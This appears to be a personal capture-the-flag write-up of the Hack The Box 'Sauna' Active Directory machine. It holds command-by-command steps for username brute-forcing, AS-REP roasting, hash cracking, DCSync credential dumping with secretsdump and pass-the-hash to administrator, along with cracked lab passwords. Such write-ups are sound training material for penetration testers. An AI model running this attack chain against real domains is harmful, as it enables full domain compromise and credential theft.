# Enumeration 

## open ports

```
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-19 18:05:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
53/tcp   open  domain        Simple DNS Plus                                                                                                     
80/tcp   open  http          Microsoft IIS httpd 10.0
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws

```

### Port 80
![[Pasted image 20230119131503.png]]


### Port 53  
zone transfer
![[Pasted image 20230119131634.png]]

### Port 389
![[Pasted image 20230119132100.png]]
DC=EGOTISTICAL-BANK, DC=LOCAL



![[Pasted image 20230119232030.png]]

brute forcing domain usernames
`./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc $ip /opt/SecLists/Usernames/xato-net-10-million-usernames.txt`

![[Pasted image 20230120010053.png]]


trying AS-REP using GetNPUsers impacket 

` GetNPUsers.py -dc-ip $ip -request 'EGOTISTICAL-BANK.LOCAL/fsmith' -no-pass`

![[Pasted image 20230120010138.png]]

cracking hash

`hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt`
![[Pasted image 20230120010445.png]]


`evil-winrm -i $ip -u fsmith -p Thestrokes23`

![[Pasted image 20230120010535.png]]

# Privesc 
running bloodhound.py to get info
```
bloodhound-python --dns-tcp -ns $ip -d EGOTISTICAL-BANK.LOCAL -u 'fsmith' -p 'Thestrokes23' -c all 
```
![[Pasted image 20230120011429.png]]


imported data to bloodhound

![[Pasted image 20230120011527.png]]


uploading winpeas to the target
using evil-winrm

```
upload winpeasany.exe
. .\winpeas.exe
```
![[Pasted image 20230120015118.png]]
![[Pasted image 20230120015259.png]]

rerun bloodhound
`bloodhound-python --dns-tcp -ns $ip -d EGOTISTICAL-BANK.LOCAL -u 'fsmith' -p 'Thestrokes23' -c all `
![[Pasted image 20230120021917.png]]
user svc_loanmngr has DCSync priv that means he can read all users passwords

using secretsdump from ipmpacket
`secretsdump.py -just-dc svc_loanmgr:'Moneymakestheworldgoround!'@$ip -outputfile dcsync_hashes`

![[Pasted image 20230120022838.png]]


```
psexec.py administrator:@$ip -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'
```


![[Pasted image 20230120022951.png]]

# Loot
fsmith user creds:
	username:fsmith
	password:Thestrokes23

svc_loanmanager
	username: svc_loanmgr
	password:Moneymakestheworldgoround!


---
Tags: #ctf #htb #ASP_roasting #DCSync #AD #kerbrute #secretsdump #GetNPUsers 
Resources:  [Sauna](https://app.hackthebox.com/machines/229)